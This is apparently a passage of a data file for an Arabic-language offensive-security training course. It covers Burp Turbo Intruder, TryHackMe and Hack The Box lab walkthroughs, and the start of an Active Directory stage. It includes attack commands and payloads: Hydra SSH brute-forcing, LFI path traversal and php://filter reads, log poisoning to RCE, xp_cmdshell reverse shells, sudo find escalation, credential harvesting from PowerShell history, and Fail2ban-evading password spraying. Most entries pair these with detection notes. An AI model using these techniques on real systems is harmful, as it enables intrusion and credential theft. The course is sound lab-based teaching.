        title: 'الفحص عالي السرعة وتجاوز معدلات الطلب عبر Turbo Intruder (Turbo Intruder Rate-Limit Bypass)',
        mitreId: 'T1110',
        category: 'High-Throughput Testing',
        explanation: 'تعتمد إضافة Turbo Intruder على محرك شبكي مكتوب بلغة C ومبرمج بـ Python، مما يتيح لها إرسال ما يزيد عن 30,000 طلب في الثانية مقارنة بـ Intruder العادي. يتم استخدامها لاكتشاف ثغرات الـ Blind SQLi واختبار قدرة الخادم على تحمل التخمين المكثف بتجاوز آليات الـ Rate Limiting الضعيفة.',
        detection: 'ترصد أنظمة الـ DDoS Protection والـ WAF الارتفاع الهائل في استهلاك الـ Sockets وتطلق حظراً فورياً على المصدر.',
        link: 'https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack',
        linkText: 'بحث James Kettle حول أداة Turbo Intruder وهجمات المليار طلب'
      }
    ],
    checklist: [
      { id: 'c10_1', text: 'تثبيت وضبط Burp Suite Proxy وشهادة CA بنجاح مع المتصفح.' },
      { id: 'c10_2', text: 'إتقان استخدام Repeater لتحليل الاستجابات وتعديل الـ Headers.' },
      { id: 'c10_3', text: 'فهم أنواع هجمات Intruder الأربعة (Sniper, Battering Ram, Pitchfork, Cluster Bomb).' }
    ],
    officialResources: [
      { name: 'PortSwigger Burp Suite Documentation', url: 'https://portswigger.net/burp/documentation', type: 'Documentation' }
    ]
  },

  {
    id: 11,
    zoneId: 'zone-arenas',
    titleAr: 'المرحلة 11: مسارات التدريب العملي على منصة TryHackMe',
    titleEn: 'Stage 11: TryHackMe Structured Pathways — Jr Pentester & Beyond',
    tag: 'Hands-on Labs',
    difficulty: 'متوسط إلى متقدم',
    xpReward: 600,
    position: { x: 25, y: 0, z: 10 },
    brief: 'خطة إنجاز المسار التعليمي الرسمي Jr Penetration Tester على TryHackMe: ترتيب الغرف الإجباري، كيفية كتابة الـ Writeups، عدم نسخ الحلول الجاهزة، وبناء الانضباط الذهني لربط مراحل الهجوم.',
    whyLearn: 'TryHackMe هي أفضل منصة عالمية تقدم بيئات سحابية تطبيقية متدرجة (Guided Labs) تتيح لك تطبيق النظريات التي تعلمتها في بيئة واقعية خطوة بخطوة مع أسئلة توجيهية.',
    professionalApplication: 'بناء المعرفة الميدانية التي تؤهلك لاجتياز الشهادات المهنية المعتمدة عالمياً مثل eJPTv2 (eLearnSecurity Junior Penetration Tester) و CompTIA PenTest+ و PNPT.',
    caseStudy: 'معظم طلاب الأمن السيبراني يقعون في فخ الاعتماد الدائم على قراءة الحلول الجاهزة (Walkthroughs) بمجرد مواجهة أول عثرة، مما يمنع تكوّن مهارة البحث والتحليل المنطقي التي لا غنى عنها في سوق العمل.',
    commonMistakes: [
      'التسرع في إنهاء الغرف لمجرد زيادة النقاط دون تدوين الملاحظات الشخصية في دفتر التوثيق.',
      'تخطي غرف الأساسيات وافتراض أنك تعرفها، مما يؤدي للتعثر لاحقاً في السيناريوهات المركبة.'
    ],
    detailedGuide: `
### 1. المسار الذهبي للبدء على TryHackMe
لضمان أقصى استفادة دون تشتت، التزم بهذا الترتيب الصارم:
1. **المسار الأول: Pre-Security Path** (لمراجعة مفاهيم الشبكات والويب ولينكس للمبتدئين تماماً).
2. **المسار الثاني: Jr Penetration Tester Path (الأهم لرقية والتيم):**
   * قسم الاستطلاع (Pentesting Fundamentals & Network Security).
   * قسم ثغرات الويب (Web Hacking & Burp Suite).
   * قسم فحص الثغرات والتصعيد (Vulnerability Research & Privilege Escalation).
   * قسم الميتاسبلويت (Metasploit).
3. **المسار الثالث: Offensive Pentesting** (للانتقال للشهادات المتقدمة مثل OSCP).

### 2. استراتيجية الـ 30 دقيقة لحل اللابات
* جرّب وحلل وابحث بنفسك لمدة **30 دقيقة على الأقل** في كل سؤال.
* استخدم Google وأدلة الأدوات الرسمية قبل البحث عن أي Walkthrough.
* إذا اضطررت لمراجعة تلميح أو حل، اقرأ **سطراً واحداً فقط** لمعرفة الخطوة التي فاتتك، ثم أغلق الحل وأكمل بنفسك فوراً!
    `,
    practicalSteps: [
      {
        step: 1,
        title: 'ربط ماكينة كالي بشبكة TryHackMe عبر نفق OpenVPN',
        desc: 'تحميل ملف التكوين .ovpn وتشغيل النفق المشفر للوصول المباشر لماكينات التدريب في المعمل السحابي.',
        command: 'sudo openvpn --config ~/Downloads/your-username.ovpn &',
        flags: [
          { flag: '--config', explanation: 'مسار ملف الاتصال المخصص لحسابك على TryHackMe' },
          { flag: '&', explanation: 'تشغيل العملية في الخلفية لتحرير شاشة التيرمينال' }
        ],
        expectedOutput: `Initialization Sequence Completed
[+] Tunnel interface tun0 established
[+] Assigned IP on THM network: 10.14.x.x`,
        proTip: 'تحقق من اكتمال الاتصال عبر الأمر ip addr show tun0: إذا ظهر عنوان IP يبدأ بـ 10.14 أو 10.18، فهذا يعني أنك متصل وجاهز للبدء.'
      },
      {
        step: 2,
        title: 'استخدام أداة Hydra لتخمين كلمات السر لخدمات SSH و FTP (eJPT Core)',
        desc: 'أداة التخمين الشبكي الأقوى لاختبار قوة كلمات سر الحسابات الإدارية عبر القواميس.',
        command: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.50 -t 4 -V',
        flags: [
          { flag: '-l admin', explanation: 'تحديد اسم المستخدم المستهدف' },
          { flag: '-P', explanation: 'مسار قاموس كلمات السر المعتمد (rockyou.txt)' },
          { flag: 'ssh://', explanation: 'البروتوكول والخدمة المستهدفة' },
          { flag: '-t 4', explanation: 'تحديد 4 اتصالات متزامنة لتجنب إغلاق السيرفر للاتصال (Rate Limiting)' },
          { flag: '-V', explanation: 'وضع العرض التفصيلي لمشاهدة كلمات السر التي يتم تجربتها لحظياً' }
        ],
        expectedOutput: `[DATA] attacking ssh://10.10.10.50:22/
[22][ssh] host: 10.10.10.50   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found`,
        proTip: 'في امتحان eJPTv2، لا ترفع معامل الـ Threads (-t) لأكثر من 4 في هجمات SSH لتفادي حظر خادم الضحية أو إسقاط الجلسة.'
      }
    ],
    youtubeVideos: [
      {
        title: 'How to Learn Ethical Hacking on TryHackMe (Fast Track Guide)',
        channel: 'NetworkChuck',
        duration: '21 دقيقة',
        url: 'https://www.youtube.com/watch?v=sWbGOq-IrN4',
        keyTakeaway: 'كيفية اختيار المسار التدريبي الصحيح واستخدام VPN وتحقيق أقصى استفادة.'
      },
      {
        title: 'Hydra Password Cracking Tutorial for Beginners',
        channel: 'David Bombal',
        duration: '27 دقيقة',
        url: 'https://www.youtube.com/watch?v=lb1Dw0elw0Q',
        keyTakeaway: 'شرح هجمات التخمين الشبكي على SSH و FTP ونماذج تسجيل الدخول بالويب.'
      }
    ],
    tryHackMeRooms: [
      { name: 'Jr Penetration Tester Official Path', url: 'https://tryhackme.com/r/path/outline/jrpenetrationtester', difficulty: 'Structured Path', whyMatters: 'المسار التدريبي الأكثر شمولاً وتكاملاً للبدء الاحترافي في الريد تيم.' },
      { name: 'Vulnerability Research Lab', url: 'https://tryhackme.com/r/room/vulnerabilityresearch', difficulty: 'Easy', whyMatters: 'كيفية البحث في قواعد ثغرات Exploit-DB ومطابقة الـ CVEs.' }
    ],
    writeup: {
      title: 'حل تحدي مسار التدريب العملي المتقدم (TryHackMe Jr Pentester Walkthrough)',
      scenario: 'محاكاة عملية حل غرفة مركبة من مسار Jr Pentester: بدء الاستطلاع الشامل، اكتشاف ثغرة File Inclusion (LFI)، تحويلها إلى Remote Code Execution عبر Log Poisoning، ثم استخراج مفاتيح SSH وتصعيد الصلاحيات محلياً إلى root وتوثيق العملية في تقرير رايت أب احترافي.',
      steps: [
        {
          phase: 'Phase 01: Service Enumeration & Web Route Discovery',
          title: 'الفحص الشبكي واكتشاف معلمات تضمين الملفات',
          action: 'تم تنفيذ فحص Nmap شامل للبورتات 80 و 22، واكتشاف موقع ويب مدعوم بـ PHP يحتوي على معامل استدعاء صفحات غير محمي: /index.php?page=about.php.',
          detection: 'تسجل أنظمة مراقبة خادم الويب (Apache Access Logs) محاولات تجربة مسارات متكررة من عنوان IP واحد.',
          mitreId: 'T1046',
          link: 'https://portswigger.net/web-security/file-path-traversal',
          linkText: 'دليل أكاديمية PortSwigger لثغرات اجتياز المسارات (Path Traversal / LFI)'
        },
        {
          phase: 'Phase 02: Local File Inclusion & Log Poisoning',
          title: 'استغلال ثغرة LFI وتسميم سجلات أباتشي لتنفيذ الكود',
          action: 'تم تأكيد قراءة /etc/passwd عبر ?page=../../../../etc/passwd، ثم إرسال طلب HTTP يحمل كود PHP خبيث في ترويسة User-Agent ليتم تسجيله في /var/log/apache2/access.log، ثم استدعاء ملف السجل عبر ثغرة الـ LFI لتنفيذ الكود والحصول على Reverse Shell.',
          detection: 'ترصد أنظمة كشف التسلل (WAF و OSSEC) وجود رموز كود PHP تنفيذي (<?php system(...) ?>) داخل ترويسات طلبات الـ HTTP أو سجلات النظام وتطلق إنذار Log Tampering.',
          mitreId: 'T1190',
          link: 'https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/file-inclusion/lfi2rce-via-apache-access-log',
          linkText: 'دليل HackTricks لتحويل ثغرات الـ LFI إلى RCE عبر سجلات خوادم أباتشي'
        },
        {
          phase: 'Phase 03: Upgrading Web Shell to Stable Interactive TTY',
          title: 'تحسين واستقرار جلسة الشيل العكسي عبر بايثون و stty',
          action: 'بعد الاتصال بـ Netcat، تم تحويل الشيل إلى TTY تفاعلي كامل عبر: python3 -c "import pty; pty.spawn(\'/bin/bash\')" ثم تفعيل stty raw -echo لتفعيل اختصارات لوحة المفاتيح والأسهم ومسح الشاشة بأمان.',
          detection: 'تسجل أنظمة EDR على الخادم إنشاء pty جديد (Pseudo-Terminal Allocation) من سياق مستخدم خادم الويب (www-data).',
          mitreId: 'T1059.004',
          link: 'https://attack.mitre.org/techniques/T1059/004/',
          linkText: 'توثيق تقنيات استخدام مفسرات الأوامر لتثبيت الشيل في MITRE ATT&CK'
        },
        {
          phase: 'Phase 04: Local Enumeration & Sudo Privilege Escalation',
          title: 'فحص صلاحيات sudo وتصعيد الصلاحيات إلى root عبر GTFOBins',
          action: 'بتشغيل أمر sudo -l، وُجد أن المستخدم يملك صلاحية تشغيل /usr/bin/find بصلاحيات root بدون كلمة سر. عبر استدعاء: sudo find . -exec /bin/sh \\; -quit، تم الحصول فورياً على شيل بصلاحيات root الكاملة وقراءة فلاج root.txt.',
          detection: 'تسجل سجلات المصادقة في لينكس (/var/log/auth.log) استدعاءات أوامر sudo المشبوهة مع وسائط -exec وتصنفها كـ Sudo Privilege Misuse.',
          mitreId: 'T1548.003',
          link: 'https://gtfobins.github.io/gtfobins/find/#sudo',
          linkText: 'توثيق تجاوز وصعود صلاحيات أمر find عبر GTFOBins'
        }
      ],
      lessonLearned: 'دمج ثغرات تبدو بسيطة مثل LFI مع أخطاء قراءة السجلات (Log Poisoning) يؤدي مباشرة لاختراق الخادم وتنفيذ الكود (RCE). الدفاع يتطلب عزل مسارات قراءة الملفات في مجلدات معقمة (Chroot Jail) ومنع تضمين مدخلات المستخدم ديناميكياً.'
    },
    secretTradecraft: [
      {
        title: 'تسميم سجلات الخادم لتحويل الـ LFI إلى RCE كامل (Apache / SSH Log Poisoning)',
        mitreId: 'T1059',
        category: 'Chained Exploitation Mechanics',
        explanation: 'عندما تفشل محاولات تضمين الملفات العادية، يبحث المهاجم عن ملفات يملك صلاحية قراءتها ويمكنه الكتابة فيها مسبقاً. سجلات Apache Access Log تسجل ترويسة User-Agent لكل زائر؛ فإذا أرسل المهاجم User-Agent يحتوي على كود PHP خبيث، ثم استدعى ملف access.log عبر ثغرة الـ LFI، يقوم مفسر PHP بتنفيذ الكود المحقون لحظياً.',
        detection: 'يقوم مسؤولو النظام بتعطيل صلاحيات القراءة لملفات /var/log/apache2/ عن مستخدمي الويب العاديين وتعيين أذونات 640 أو 600 حصراً لـ root.',
        link: 'https://www.netspi.com/blog/technical/web-application-pentesting/apache-log-poisoning-via-lfi/',
        linkText: 'بحث NetSPI حول تقنيات تنفيذ الكود عبر تسميم ملفات السجلات'
      },
      {
        title: 'التخمين الشبكي الذكي لتفادي حظر Fail2ban (Slow-Rate Password Spraying)',
        mitreId: 'T1110.003',
        category: 'Brute-Force Evasion',
        explanation: 'تقوم خدمات مثل Fail2ban بحظر أي عنوان IP يقوم بـ 5 محاولات فاشلة متتالية خلال دقيقة واحدة. يتجاوز المهاجمون هذا القيد عبر تقنية Password Spraying: تجربة كلمة سر واحدة شائعة (مثل Winter2024!) على 50 حساباً مختلفاً بفارق زمني دقيقتين بين كل محاولة، مما يمنع تجاوز عتبة الحظر على أي حساب بمفرده.',
        detection: 'تتصدى أنظمة الـ SIEM الحديثة عبر حساب إجمالي محاولات الفشل على مستوى الشبكة ككل وليس فقط لكل مستخدم على حدة.',
        link: 'https://attack.mitre.org/techniques/T1110/003/',
        linkText: 'توثيق تقنيات Password Spraying على MITRE ATT&CK'
      },
      {
        title: 'استخراج البيانات المضمنة عبر مشغلات PHP Filters (PHP Base64 Wrapper Exfiltration)',
        mitreId: 'T1005',
        category: 'Data Exfiltration via Wrappers',
        explanation: 'إذا كانت ثغرة الـ LFI تقوم بتنفيذ ملفات PHP بدلاً من عرضها كنص، فلن تتمكن من قراءة ملف config.php لأنه سينفذ في الخادم وتظهر صفحة بيضاء. الحل هو استخدام مشغل: php://filter/convert.base64-encode/resource=config.php؛ حيث يجبر PHP على تشفير الملف بتنسيق Base64 قبل عرضه، مما يمنع تنفيذه ويتيح قراءة كود الاتصال وقواعد البيانات بالكامل.',
        detection: 'ترصد أنظمة جدران حماية الويب (WAF) وجود سلسلة php://filter في معلمات الطلبات وتمنعها فورياً.',
        link: 'https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/file-inclusion/php-wrappers',
        linkText: 'دليل HackTricks الشامل لاستغلال مشغلات PHP Wrappers في قراءة الشيفرات'
      }
    ],
    checklist: [
      { id: 'c11_1', text: 'ربط كالي بنجاح بشبكة TryHackMe عبر OpenVPN والتحقق من كارت tun0.' },
      { id: 'c11_2', text: 'إنجاز غرف مسار Jr Penetration Tester الأساسية وكتابة توثيق شخصي.' },
      { id: 'c11_3', text: 'إتقان استخدام أداة Hydra في التخمين على الخدمات الشبكية.' }
    ],
    officialResources: [
      { name: 'TryHackMe Learning Paths Directory', url: 'https://tryhackme.com/r/paths', type: 'Platform' }
    ]
  },

  {
    id: 12,
    zoneId: 'zone-arenas',
    titleAr: 'المرحلة 12: تحديات منصة Hack The Box ومسابقات الـ CTF',
    titleEn: 'Stage 12: Hack The Box Mastery, Starting Point & CTF Methodologies',
    tag: 'Hands-on Labs',
    difficulty: 'متقدم',
    xpReward: 650,
    position: { x: 15, y: 0, z: 20 },
    brief: 'الانتقال إلى لابات Hack The Box المفتوحة وغير الموجهة: حل ماكينات Starting Point (Tier 0, 1, 2)، تثبيت وتحسين الشيل (Shell Stabilization)، واستراتيجيات حل مسابقات Capture The Flag (CTF).',
    whyLearn: 'إذا كانت TryHackMe تعطيك التوجيه والأسئلة المساعدة، فإن Hack The Box تعطيك عنوان IP فقط في شاشة سوداء تماماً وتتركك تعتمد على نفسك بالكامل! هذا هو السيناريو المطابق لاختبارات الاختراق الحقيقية.',
    professionalApplication: 'الاستعداد لاجتياز أصعب الشهادات العالمية المعتمدة مثل OSCP (Offensive Security Certified Professional) و CPTS (Certified Penetration Testing Specialist).',
    caseStudy: 'كثير من الشركات الكبرى تطلب رابط حسابك على Hack The Box أو رتبتك (Rank: Pro Hacker / Guru) كدليل عملي لا يقبل الشك على مهارتك الهجومية قبل توظيفك.',
    commonMistakes: [
      'البدء مباشرة بماكينات Medium أو Hard على HTB دون إكمال مسار Starting Point أولاً، مما يصيب المتعلم بالإحباط الشديد.',
      'نسيان إجراء فحص UDP للمنافذ عند عدم العثور على أي ثغرة واضحة على بورتات TCP.'
    ],
    detailedGuide: `
### 1. منهجية حل ماكينات Hack The Box (The Golden Loop)
1. **الفحص الكامل (Port Scanning):** مسح كل المنافذ لمعرفة ما يعمل على السيرفر.
2. **استكشاف الويب والمسارات (Fuzzing / Directory Enumeration):** استخدام Gobuster أو Feroxbuster لاكتشاف الملفات السرية ولوحات الإدارة.
3. **تحديد الثغرة (Vulnerability Identification):** مطابقة الإصدارات المكتشفة مع ثغرات الـ CVE المعلنة أو ثغرات الويب الشائعة.
4. **الحصول على موطئ قدم (Initial Foothold):** استغلال الثغرة والحصول على Reverse Shell غير مستقر على النظام.
5. **تثبيت وتحسين الشيل (Shell Stabilization):** تحويل الشيل إلى TTY تفاعلي كامل باستخدام بايثون.
6. **الاستطلاع الداخلي وتصعيد الصلاحيات (Internal Enum & Privilege Escalation):** استغلال ثغرات النظام للوصول إلى صلاحيات root أو Administrator.

### 2. قائمة ماكينات Starting Point الإلزامية للمبتدئين
* **Meow & Fawn:** أساسيات Telnet و FTP وسرقة كلمات السر المخزنة بنص صريح.
* **Dancing:** ثغرات مشاركة ملفات ويندوز (SMB Anonymous Access).
* **Archetype:** التعامل مع خوادم قواعد البيانات MSSQL وكسر كلمات سر المسؤول.
* **Oopsie:** تجميع بين ثغرات الويب (IDOR & Cookie Manipulation) وتصعيد صلاحيات لينكس عبر ملفات SUID.
    `,
    practicalSteps: [
      {
        step: 1,
        title: 'تثبيت وتحسين الـ Reverse Shell التفاعلي الكامل عبر Python و stty (eJPT & OSCP Core)',
        desc: 'أهم تسلسل أوامر بعد الحصول على شيل غير مستقر لمنع إغلاق الشيل عند الضغط على Ctrl+C وتفعيل مفاتيح الأسهم ومسح الشاشة.',
        command: 'python3 -c "import pty; pty.spawn(\'/bin/bash\')"\n# اضغط Ctrl+Z لتعليق الشيل بالخلفية ثم نفذ في كالي:\nstty raw -echo; fg\nexport TERM=xterm',
        flags: [
          { flag: 'pty.spawn', explanation: 'إنشاء Pseudo-Terminal تفاعلي كامل داخل بيئة بايثون' },
          { flag: 'stty raw -echo', explanation: 'تمرير أوامر لوحة المفاتيح والـ signals مباشرة للشيل دون اعتراضها' },
          { flag: 'export TERM=xterm', explanation: 'تمكين دعم مسح الشاشة بأمر clear واستخدام محررات النصوص nano' }
        ],
        expectedOutput: `student@victim-box:~$ clear
[Interactive Full TTY Terminal Activated - Arrows and Ctrl+C working]`,
        proTip: 'إذا لم تكن بايثون مثبتة على الضحية، جرب: /bin/bash -i أو script /dev/null -c bash لتحسين الشيل فوراً.'
      },
      {
        step: 2,
        title: 'الاستماع واستقبال الشيل العكسي عبر Netcat Listener',
        desc: 'تجهيز منفذ الاستماع في كالي لاستقبال الاتصال القادم من الضحية عند تفجير الثغرة.',
        command: 'nc -nvlp 4444',
        flags: [
          { flag: '-n', explanation: 'الوضع الرقمي دون محاولة حل أسماء الـ DNS لتسريع الاستجابة' },
          { flag: '-v', explanation: 'عرض المخرجات التفصيلية (Verbose Mode)' },
          { flag: '-l', explanation: 'وضع الاستماع (Listen Mode)' },
          { flag: '-p 4444', explanation: 'رقم المنفذ المحلي المفتوح لاستقبال الاتصال' }
        ],
        expectedOutput: `listening on [any] 4444 ...
connect to [10.10.10.15] from (UNKNOWN) [10.10.10.50] 53210
Linux victim-box 5.4.0-42-generic #46-Ubuntu SMP
uid=1001(www-data) gid=1001(www-data) groups=1001(www-data)`,
        proTip: 'إذا كان الجدار الناري للضحية يمنع الاتصالات الخارجة على بورتات غريبة، استمع دائماً على بورت 80 أو 443 لأن الفايروول غالباً ما يسمح بترافيك الويب دون حظر!'
      }
    ],
    youtubeVideos: [
      {
        title: 'Upgrading Reverse Shells to Fully Interactive TTY',
        channel: 'John Hammond',
        duration: '15 دقيقة',
        url: 'https://www.youtube.com/watch?v=d_2eK8b8L0s',
        keyTakeaway: 'شرح ميكانيكية تثبيت الشيل باستخدام بايثون و stty لتفادي انقطاع الاتصال.'
      },
      {
        title: 'Hack The Box Starting Point Complete Walkthrough',
        channel: 'IppSec',
        duration: '45 دقيقة',
        url: 'https://www.youtube.com/watch?v=2mszCgE5aCo',
        keyTakeaway: 'المنهجية القياسية لفحص ماكينات HTB وتحديد الثغرات وتصعيد الصلاحيات.'
      }
    ],
    tryHackMeRooms: [
      { name: 'What The Shell? (Intro to Shells)', url: 'https://tryhackme.com/r/room/introtoshells', difficulty: 'Medium', whyMatters: 'الدليل الأكثر شمولاً لأنواع الشيلات: Reverse Shells, Bind Shells, Web Shells.' },
      { name: 'CC: Pen Testing Review', url: 'https://tryhackme.com/r/room/ccpentesting', difficulty: 'Medium', whyMatters: 'مراجعة عملية شاملة لجميع أدوات الاختراق والتثبيت قبل البدء في HTB.' }
    ],
    writeup: {
      title: 'منهجية حل ماكينات Hack The Box المفتوحة وتصعيد الصلاحيات (HTB Machine Walkthrough Methodology)',
      scenario: 'محاكاة كاملة لاختراق ماكينة تدريبية مستقلة على Hack The Box (سيناريو ماكينة Archetype): استطلاع المنافذ، اكتشاف خدمة قاعدة بيانات MSSQL مكشوفة، كسر كلمة سر الحساب، تنفيذ أوامر النظام عبر xp_cmdshell، ثم استخراج مفاتيح DPAPI المخزنة محلياً وتصعيد الصلاحيات إلى Administrator.',
      steps: [
        {
          phase: 'Phase 01: Full TCP Port Scanning & MSSQL Probing',
          title: 'فحص المنافذ واكتشاف خادم قواعد البيانات المفتوح',
          action: 'تم تنفيذ فحص Nmap للمنافذ المفتوحة واكتشاف بورت Microsoft SQL Server 1433 ومشاركة ملفات SMB 445، وباستخدام أداة impacket-mssqlclient تم تسجيل الدخول بنجاح بحساب sql_svc وكلمة سر افتراضية تم استخراجها من ملف إعدادات مسرب في مشاركة ملفات غير محمية.',
          detection: 'تسجل خوادم ويندوز أحداث تسجيل دخول MSSQL (Event ID 18454: Login succeeded for user) قادمة من عنوان IP خارجي جديد.',
          mitreId: 'T1046',
          link: 'https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server',
          linkText: 'دليل HackTricks لاختبار واستغلال خوادم قواعد بيانات Microsoft SQL'
        },
        {
          phase: 'Phase 02: Initial Foothold via xp_cmdshell',
          title: 'تفعيل أوامر النظام وتنفيذ Reverse Shell مشفر',
          action: 'تم تفعيل تعليمة xp_cmdshell عبر: EXEC sp_configure \'xp_cmdshell\', 1; RECONFIGURE; ثم استدعاء أمر PowerShell مشفر يقوم بتنزيل وتشغيل reverse shell متصل بـ Netcat Listener في كالي.',
          detection: 'ترصد أنظمة EDR على الخادم تشغيل sqlservr.exe لعملية cmd.exe أو powershell.exe وتطلق تنبيهاً أمنياً حرجاً (Process Tree Anomaly - Sysmon Event ID 1).',
          mitreId: 'T1059.001',
          link: 'https://attack.mitre.org/techniques/T1059/001/',
          linkText: 'توثيق تقنيات تنفيذ الأوامر عبر PowerShell في MITRE ATT&CK'
        },
        {
          phase: 'Phase 03: Shell Stabilization & Internal Host Reconnaissance',
          title: 'تثبيت الجلسة وفحص سجلات الأوامر السابقة للمستخدم',
          action: 'تم تشغيل أداة winPEAS في الذاكرة لفحص النظام الداخلي، وتفقد ملف تاريخ أوامر PowerShell المخزن في المسار: %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHistory.txt.',
          detection: 'ترصد أدوات حماية المجلدات الوصول وقراءة ملف ConsoleHistory.txt من عمليات برمجية غير تفاعلية.',
          mitreId: 'T1552.003',
          link: 'https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS',
          linkText: 'مستودع أداة winPEAS الرسمية لاستكشاف ثغرات تصعيد الصلاحيات في ويندوز'
        },
        {
          phase: 'Phase 04: Credential Extraction & Administrator Elevation',
          title: 'استخراج كلمة سر المدير من السجلات والتحكم الكامل بالنظام',
          action: 'كشف ملف ConsoleHistory.txt عن أمر سابق استخدمه مسؤول النظام لربط محرك أقراص: net use z: \\\\backups\\share /u:Administrator MEGACORP_Admin2024!. باستخدام هذه الاعتمادات، تم الدخول عبر Evil-WinRM بصلاحيات Administrator الكاملة وقراءة فلاج root.txt.',
          detection: 'تسجل سجلات الأمان Windows Event ID 4624 (Logon Type 3) مع صلاحيات إدارية مرتفعة تم منحها للمستخدم (Event ID 4672: Special privileges assigned to new logon).',
          mitreId: 'T1078.003',
          link: 'https://0xdf.gitlab.io/',
          linkText: 'رايت أبس ومقالات الباحث 0xdf المتخصصة في تحليل ماكينات Hack The Box'
        }
      ],
      lessonLearned: 'ترك صلاحيات إدارية (sa) لقواعد البيانات دون تغيير كلمات السر الافتراضية، مع تخزين كلمات المرور بنص صريح في ملفات سجلات الأوامر (PSReadLine ConsoleHistory.txt)، يهدم أي دفاعات طرفية. يجب تقييد صلاحيات الخدمات وحذف سجلات الأوامر الحساسة.'
    },
    secretTradecraft: [
      {
        title: 'استخراج كلمات المرور من سجلات أوامر PowerShell التاريخية (ConsoleHistory.txt Harvesting)',
        mitreId: 'T1552.003',
        category: 'Credential Access',
        explanation: 'تقوم ميزة PSReadLine في Windows بحفظ كل أمر يكتبه المستخدم في التيرمينال داخل ملف نصي في مسار %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHistory.txt. غالباً ما يكتب مسؤولو النظام أوامر net use أو runas تحتوي على كلمات سر صريحة، مما يمنح المهاجم وصولاً إدارياً فورياً بمجرد قراءة هذا الملف.',
        detection: 'يتم رصد الوصول لملف ConsoleHistory.txt عبر قواعد Sysmon Event ID 11 (File Create / Access) ومراقبة أدوات الفحص التلقائي.',
        link: 'https://attack.mitre.org/techniques/T1552/003/',
        linkText: 'توثيق تقنيات استخراج الاعتمادات من ملفات الأوامر في MITRE ATT&CK'
      },
      {
        title: 'تحويل الشيل النصي في ويندوز إلى جلسة تفاعلية كاملة عبر ConPty (Windows ConPty Interactive Shell)',
        mitreId: 'T1059.001',
        category: 'Shell Enhancement & Stabilization',
        explanation: 'شيلات ويندوز العادية المفتوحة بـ Netcat لا تدعم تشغيل أوامر تفاعلية (مثل powershell بدون نافذة أو برامج تطلب إدخال كلمة سر). باستخدام أداة ConPtyShell، يتم استغلال Windows Pseudo Console (ConPTY) لإنشاء شيل تفاعلي حقيقي يدعم تصحيح الخطوط، واختصارات الأسهم، والبرامج التفاعلية دون انقطاع.',
        detection: 'ترصد أنظمة EDR إنشاء قنوات ConPTY Named Pipes مشبوهة وربطها بمقابس اتصال شبكية خارجية.',
        link: 'https://github.com/antonioCoco/ConPtyShell',
        linkText: 'مستودع أداة ConPtyShell لإنشاء شيلات تفاعلية متقدمة لأنظمة ويندوز'
      },
      {
        title: 'نقل الملفات الخفي في بيئات ويندوز عبر بروتوكول SMB الداخلي (Stealth SMB File Delivery)',
        mitreId: 'T1105',
        category: 'Ingress Tool Transfer',
        explanation: 'بدلاً من تنزيل الأدوات عبر HTTP باستخدام certutil أو Invoke-WebRequest (وهو ما ترصده معظم برمجيات AV/EDR)، يقوم المهاجم بتشغيل خادم SMB محلي عبر impacket-smbserver، ثم تشغيل الأداة مباشرة من المشاركة الشبكية على جهاز الضحية عبر: \\\\attacker-ip\\share\\tool.exe دون كتابتها على قرص الضحية.',
        detection: 'ترصد جدران الحماية الاتصالات الصادرة على منفذ TCP 445 المتجهة لعناوين IP عامة خارجية خارج نطاق الشبكة المحلية وتفرض حظرها تلقائياً.',
        link: 'https://attack.mitre.org/techniques/T1105/',
        linkText: 'توثيق تقنيات نقل وتمرير الأدوات الهجومية في إطار MITRE ATT&CK'
      }
    ],
    checklist: [
      { id: 'c12_1', text: 'إنهاء مسار Starting Point (Tier 0 & 1) على Hack The Box.' },
      { id: 'c12_2', text: 'إتقان تثبيت الـ Reverse Shell التفاعلي عبر بايثون و stty.' },
      { id: 'c12_3', text: 'فهم دورة حياة حل الماكينات غير الموجهة (Un-guided Machines).' }
    ],
    officialResources: [
      { name: 'Hack The Box Official Platform', url: 'https://www.hackthebox.com', type: 'Platform' },
      { name: 'IppSec Video Walkthroughs (The Legend of HTB)', url: 'https://ippsec.rocks', type: 'Video Library' }
    ]
  },

  {
    id: 13,
    zoneId: 'zone-ad',
    titleAr: 'المرحلة 13: معمارية وهجمات أكتيف دايركتوري (Active Directory & Kerberos Attacks)',
    titleEn: 'Stage 13: Active Directory Architecture, Kerberos & Domain Attacks',
    tag: 'Active Directory',
    difficulty: 'متقدم جداً',
    xpReward: 700,
    position: { x: 5, y: 0, z: 25 },
    brief: 'قلب بيئات الشركات والمؤسسات الضخمة: معمارية الـ Domain Controller، بروتوكولات Kerberos و LDAP و NTLM، رسم مسارات الهجوم عبر BloodHound، وهجمات Kerberoasting و AS-REP Roasting وسرقة التذاكر (Golden & Silver Tickets).',
    whyLearn: 'أكثر من 95% من شركات Fortune 500 تستخدم Active Directory لإدارة هويات وصلاحيات موظفيها وأجهزتها. في العالم الحقيقي، معظم عمليات الريد تيم تدور حول اختراق جهاز عادي في الشبكة ثم التحرك عرضياً والسيطرة على الدومين (Domain Admin).',
    professionalApplication: 'محاكاة هجمات الفدية المتقدمة (Ransomware Actors)، تقييم أمان بيئات العمل الهجينة والمصارف، واستخراج مسارات السيطرة الخفية لتقديم خطط تعزيز الأمان للشركات.',
    caseStudy: 'اختراق SolarWinds الشهير (2020)؛ حيث اعتمد المهاجمون على تزوير رموز وشهادات الـ SAML و Kerberos للتنقل بين الأنظمة الداخلية والسحابية دون إطلاق أي إنذارات.',
    commonMistakes: [
      'الاعتقاد بأن Kerberos مشفر بالكامل ولا يمكن استغلاله، بينما هجوم Kerberoasting يستغل صلاحية أي مستخدم شرعي في طلب تذكرة خدمة (TGS) لفك تشفير كلمة سر حسابات الخدمة أوفلاين.',
      'تجاهل تشغيل أداة BloodHound التي ترسم لك شبكة العلاقات والصلاحيات في واجهة رسومية تكشف أقصر طريق للـ Domain Admin.'
    ],
    detailedGuide: `
### 1. كيف يعمل بروتوكول Kerberos؟ (Three-Headed Dog)
